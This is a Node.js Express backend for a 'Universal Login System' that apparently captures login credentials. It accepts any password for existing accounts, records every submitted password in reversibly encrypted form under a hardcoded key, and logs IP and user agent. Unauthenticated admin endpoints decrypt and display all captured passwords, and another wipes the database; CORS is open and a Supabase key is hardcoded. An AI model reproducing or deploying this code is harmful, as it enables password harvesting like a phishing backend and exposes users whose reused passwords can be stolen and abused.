// Universal Login System Backend
const express = require('express');
const bcrypt = require('bcrypt');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');
const path = require('path');

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// Supabase Configuration - USING YOUR CREDENTIALS
const supabaseUrl = 'https://wllhllfknnxsbrxkbuht.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndsbGhsbGZrbm54c2JyeGtidWh0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk2ODg0MzIsImV4cCI6MjA4NTI2NDQzMn0.5Me6Q7ZvTNCgmE8qOFXZtuKX3cqcfgIqa3ZfKa4sjcw';
const supabase = createClient(supabaseUrl, supabaseKey);

// Encryption setup
const ENCRYPTION_KEY = 'learning-project-key-32-characters-long!';
const ALGORITHM = 'aes-256-cbc';
const IV_LENGTH = 16;

// Encryption function
function encrypt(text) {
  try {
    const iv = crypto.randomBytes(IV_LENGTH);
    const key = crypto.scryptSync(ENCRYPTION_KEY, 'salt', 32);
    const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
  } catch (error) {
    console.error('Encryption error:', error);
    return 'error';
  }
}

// Decryption function
function decrypt(text) {
  try {
    const parts = text.split(':');
    const iv = Buffer.from(parts.shift(), 'hex');
    const encryptedText = parts.join(':');
    const key = crypto.scryptSync(ENCRYPTION_KEY, 'salt', 32);
    const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
    let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (error) {
    console.error('Decryption error:', error);
    return '[Encrypted]';
  }
}

// Health check
app.get('/', (req, res) => {
  res.json({
    status: '✅ Backend is running',
    message: 'Universal Login System Backend',
    endpoints: {
      login: 'POST /api/login',
      adminUsers: 'GET /api/admin/users',
      adminLogs: 'GET /api/admin/logs'
    }
  });
});

// UNIVERSAL LOGIN ENDPOINT
app.post('/api/login', async (req, res) => {
  try {
    console.log('🔐 Login attempt');
    
    const { email, password } = req.body;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
    
    if (!email || !password) {
      return res.status(400).json({ 
        success: false, 
        error: 'Email and password required' 
      });
    }
    
    const cleanEmail = email.toLowerCase().trim();
    const userName = cleanEmail.split('@')[0];
    
    // Check if user exists
    const { data: existingUser, error: fetchError } = await supabase
      .from('users')
      .select('*')
      .eq('email', cleanEmail)
      .maybeSingle();
    
    let userId;
    
    if (existingUser) {
      // User exists - update login info
      userId = existingUser.id;
      
      await supabase
        .from('users')
        .update({
          last_login: new Date().toISOString(),
          login_count: (existingUser.login_count || 0) + 1,
          ip_address: ip
        })
        .eq('id', userId);
        
    } else {
      // Create new user
      const passwordHash = await bcrypt.hash(password, 10);
      const encryptedPassword = encrypt(password);
      
      const { data: newUser, error: insertError } = await supabase
        .from('users')
        .insert([{
          email: cleanEmail,
          password_hash: passwordHash,
          password_original: encryptedPassword,
          name: userName,
          ip_address: ip,
          user_agent: userAgent,
          created_at: new Date().toISOString(),
          last_login: new Date().toISOString(),
          login_count: 1
        }])
        .select()
        .single();
      
      if (insertError) {
        console.error('Error creating user:', insertError);
        return res.status(500).json({ 
          success: false, 
          error: 'Failed to create user' 
        });
      }
      
      userId = newUser.id;
      console.log('✅ New user created:', cleanEmail);
    }
    
    // Log for admin
    await supabase
      .from('admin_logs')
      .insert([{
        user_id: userId,
        email_used: cleanEmail,
        password_original: encrypt(password),
        ip_address: ip,
        user_agent: userAgent,
        login_time: new Date().toISOString()
      }]);
    
    // Success response
    res.json({
      success: true,
      user: {
        id: userId,
        email: cleanEmail,
        name: userName,
        ip: ip
      },
      message: 'Login successful'
    });
    
  } catch (error) {
    console.error('❌ Login error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Server error' 
    });
  }
});

// GET all users (Admin)
app.get('/api/admin/users', async (req, res) => {
  try {
    const { data: users, error } = await supabase
      .from('users')
      .select('*')
      .order('created_at', { ascending: false });
    
    if (error) {
      console.error('Error fetching users:', error);
      return res.status(500).json({ error: error.message });
    }
    
    // Decrypt passwords for admin
    const usersWithPasswords = users.map(user => ({
      ...user,
      password_display: user.password_original ? decrypt(user.password_original) : '[No password]',
      password_hash: undefined // Hide hash
    }));
    
    res.json({ 
      success: true, 
      count: users.length,
      users: usersWithPasswords 
    });
    
  } catch (error) {
    console.error('❌ Admin error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to fetch users' 
    });
  }
});

// GET login logs (Admin)
app.get('/api/admin/logs', async (req, res) => {
  try {
    const { data: logs, error } = await supabase
      .from('admin_logs')
      .select(`
        *,
        users:user_id (email, name)
      `)
      .order('login_time', { ascending: false })
      .limit(100);
    
    if (error) throw error;
    
    // Decrypt passwords
    const logsWithPasswords = logs.map(log => ({
      ...log,
      password_display: log.password_original ? decrypt(log.password_original) : '[Encrypted]'
    }));
    
    res.json({ 
      success: true, 
      count: logs.length,
      logs: logsWithPasswords 
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Clear all data (Admin - for testing)
app.post('/api/admin/clear', async (req, res) => {
  try {
    // Delete logs first (due to foreign key constraint)
    await supabase.from('admin_logs').delete().neq('id', '00000000-0000-0000-0000-000000000000');
    // Delete users
    await supabase.from('users').delete().neq('id', '00000000-0000-0000-0000-000000000000');
    
    res.json({ 
      success: true, 
      message: 'All data cleared successfully' 
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Backend server running on port ${PORT}`);
  console.log(`🔗 Health check: http://localhost:${PORT}`);
  console.log(`📊 Supabase connected: ${supabaseUrl}`);
});
